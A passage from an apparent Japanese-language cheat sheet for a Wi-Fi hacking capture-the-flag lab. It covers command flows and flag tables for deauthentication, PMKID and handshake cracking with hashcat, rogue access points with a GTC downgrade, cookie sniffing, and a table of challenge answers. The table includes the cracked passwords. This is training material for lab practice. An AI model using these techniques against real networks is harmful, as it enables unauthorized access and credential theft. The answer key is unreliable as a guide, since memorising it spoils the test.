    → または arp-scan → ユーザーサーバー → Flag（認証なし）
```

### PMKID
```
スキャン → BSSID+CH → hcxdumptool（クライアント不要）
    → .pcapng → hcxpcapngtool → hash 22000
    → hashcat → PSK → 接続 → Flag
```

### MGT
```
スキャン → BSSID+CH → EAP キャプチャ
    → tshark → eap.type → 攻撃手法
    ├─ MD5: hcxpcapngtool → hashcat -m 4800
    └─ PEAP/TTLS: eaphammer + Deauth → MSCHAPv2 → hashcat -m 5500
        → Credential → flag{DOMAIN\USER:PASS}
```

---

## 🧠 セクション10: フラグとよく使うオプションの意味

### `airodump-ng`

| フラグ | 意味 |
|-----|------|
| `-w` | プレフィックス付きで保存 |
| `-c` | チャンネルを固定 |
| `--bssid` | BSSID でフィルタ |
| `--band abg` | 全バンド |
| `--wps` | WPS を表示 |
| `--manufacturer` | メーカー |
| `--output-format` | 出力形式 |

### `aireplay-ng`

| フラグ | 意味 |
|-----|------|
| `-1 3600 -q 10` | Fake Auth |
| `--arpreplay` | ARP Replay |
| `-0 N` | N 個の Deauth フレーム |
| `-5` | Fragmentation |
| `-4` | ChopChop |
| `-a` | BSSID |
| `-c` | クライアント MAC |
| `-h` | 送信元 MAC |

### `aircrack-ng`

| フラグ | 意味 |
|-----|------|
| `-w` | ワードリスト |
| `-K` | KoreK 攻撃 |
| `-b` | BSSID |

### `hcxdumptool`

| フラグ | 意味 |
|-----|------|
| `-i` | 専用モニターインターフェース |
| `-w` | pcapng ファイル |
| `-c` | チャンネル（`7a` = CH 7 band 2.4） |
| `--rds=2` | ライブ表示 |
| `-A` | フレームに ACK |
| `--disable_disassociation` | 自動 Deauth の防止 |

### `hashcat`

| モード | 用途 |
|-----|------|
| `-m 22000` | WPA-PBKDF2-PMKID+EAPOL（新形式） |
| `-m 2500` | WPA-EAPOL-PBKDF2（旧形式） |
| `-m 4800` | EAP-MD5 |
| `-m 5500` | MSCHAPv2 |
| `-m 5600` | NetNTLMv2 |
| `-a 0` | Straight（辞書） |

### `wpa_supplicant`

| フラグ | 意味 |
|-----|------|
| `-Dnl80211` | 標準ドライバ |
| `-i<iface>` | インターフェース |
| `-c<file>` | 設定 |

### `tshark` — よく使う Wi-Fi フィルタ

| フィルタ | 用途 |
|-------|------|
| `eap` | すべての EAP フレーム |
| `eap.type == 4` | EAP-MD5 |
| `eap.type == 25` | PEAP |
| `wlan.fc.type_subtype == 0` | Association Request |
| `wlan.fc.type_subtype == 4` | Probe Request |
| `wlan.fc.type_subtype == 8` | Beacon |
| `wlan.fc.type_subtype == 12` | Deauth |
| `wlan.bssid == xx:xx:...` | BSSID でフィルタ |
| `wlan.sa == xx:xx:...` | 送信元 MAC でフィルタ |
| `http` | HTTP トラフィック |
| `http.cookie` | Cookie |
| `http.set_cookie` | Set-Cookie |
| `http.request.method == "POST"` | POST フォーム |

---

## 🚨 セクション11: 重要なコツとよくある間違い

### ⚠️ 1. モニターカード
- **HCXDumptool** には必ず **専用** のモニターインターフェース（別の `phy` 上）を使用 — `wlan0mon` ではない。
- ネットワークへの **接続** には **managed** インターフェースを使用。
- 各攻撃の後、次のステップの前に `pkill wpa_supplicant && pkill dhclient`。

### ⚠️ 2. Deauth を伴うキャプチャ
- **Deauth の前** に `airodump-ng` をチャンネルに固定（`-c N`）。
- **Deauth の前** のキャプチャは Handshake を見逃す可能性がある。
- **順序:** チャンネルでキャプチャ → Deauth → 再キャプチャ → `WPA handshake` を確認。

### ⚠️ 3. WPS Locked
- `wash` の `Lck: Yes` = 一時的にロック。
- 解決策: `-L`（無視）→ `bully` → 待つ → 代替手法。

### ⚠️ 4. PMKID
- 別の `phy` 上でのみ動作。
- AP から PMKID を抽出するのに数分かかることがある。
- PMKID が見つからない場合、実際のクライアントへの Deauth を試す。

### ⚠️ 5. Enterprise
- クライアントが **サーバー証明書を検証** する場合 → Rogue AP は失敗。
- 解決策: `--negotiate gtc-downgrade`（平文パスワードの窃取）。
- TLS には有効なクライアント証明書が必要。

### ⚠️ 6. HMAC / フラグ形式
- Enterprise フラグ形式: `flag{DOMAIN\USERNAME:PASSWORD}`
- EAP-MD5 の式: `Response = MD5(ID || Password || Challenge)`

### ⚠️ 7. IPv6 と Client Isolation
- `arp-scan` が空の場合、**Client Isolation** が有効な可能性。
- `nmap -sn 192.168.2.0/24` でも試せる。

---

## 📁 セクション12: 完全なプロジェクトの構造

```
~/wifi/
├── scan-01.cap            # 初期スキャン
├── scan-01.csv
├── scanc6-01.cap          # チャンネル 6 のキャプチャ（wifi-mobile）
├── scanc6-01-dec.cap      # 復号済み
├── wifi-old-01.cap        # WEP
├── legacy-01.cap          # EAP
├── campus.pcapng          # PMKID
├── campus.22000           # hashcat 用ハッシュ
├── hostapd.hccapx         # Rogue AP からの Handshake
├── hash.22000             # 新しい hashcat 形式
├── open.conf              # オープンネットワーク設定
├── psk.conf               # PSK 設定
├── wep.conf               # WEP 設定
├── campus.conf            # WPA2-PSK 設定
└── hostapd-mana.conf      # Rogue AP 設定
```

---

## 🎓 セクション13: 各攻撃前の最終チェックリスト

- [ ] `pkill wpa_supplicant && pkill dhclient`
- [ ] `airmon-ng check kill`
- [ ] モニターモードインターフェースがアクティブ（`iw dev`）
- [ ] ターゲットチャンネルと BSSID が特定済み
- [ ] NetworkManager プロセスが停止済み
- [ ] Rogue AP 用: 空いている managed インターフェースがある
- [ ] PMKID 用: 別の phy 上の専用モニターインターフェース
- [ ] ワードリストが準備済み（`/root/rockyou-top100000.txt`）
- [ ] PSK/KEY 取得後: `.conf` ファイルを作成済み
- [ ] 接続後: `dhclient` と `ip route` を実行済み
- [ ] Web 用: ゲートウェイと内部サーバー IP を特定済み

---

## 🏁 セクション14: 主要チャレンジとクイック回答（Writeup より）

| # | ネットワーク | 手法 | 出力 |
|---|-------|------|--------|
| 01 | wifi-global | スキャン | CH=44 |
| 02 | wifi-IT | チャンネル 11 スキャン | クライアント BSSID |
| 03 | （Probe） | tshark | `wifi-offices` |
| 04 | （隠し） | mdk4 ブルートフォース ESSID | `wifi-free` |
| 05 | wifi-free | 接続 + admin/admin | Flag |
| 06 | wifi-guest | MAC Spoofing + HTTP Sniff | `free1:Jyl1iq8UajZ1fEK` |
| 07 | wifi-old | besside-ng | `11:bb:33:cd:55` |
| 08 | wifi-mobile | Handshake + rockyou | `starwars1` |
| 09 | wifi-mobile | airdecap-ng | `192.168.2.1`、`192.168.2.8` |
| 10 | wifi-mobile | Cookie Hijack | `PHPSESSID=29622...` |
| 11 | wifi-mobile | arp-scan | サーバー `192.168.2.7` |
| 12 | wifi-offices | Rogue AP + Hashcat | `password1` |
| 28 | wifi-event | WPS Pixie/PIN | `@MegaPSKP@ssword!@` |
| 29 | wifi-corp-legacy | EAP-MD5 + hashcat 4800 | `WORKGROUP\administrator:pinkfloyd7` |
| 31 | wifi-campus | PMKID + hashcat 22000 | `basketball` |

---

## 🧭 セクション15: 最終ステップ — PSK/KEY からフラグへ

任意のネットワークのキーを取得した後:

```bash
# 1. 接続設定を作成
# 2. 接続
sudo wpa_supplicant -Dnl80211 -iwlanX -c ~/wifi/<name>.conf
# 3. IP を取得
sudo dhclient wlanX -v
# 4. ネットワークを特定
ip a show wlanX
ip route | grep default
# 5. 内部ネットワークをスキャン（Client Isolation が無効な場合）
sudo arp-scan -I wlanX -l
# 6. Web サーバーにアクセス
curl -s -m 3 http://<IP>/ | grep -o 'flag{[^}]*}'
# 7. ログインが必要な場合 → トラフィックから Cookie（airdecap-ng）または HTTP Sniff から認証情報
```


---

2026/11/06
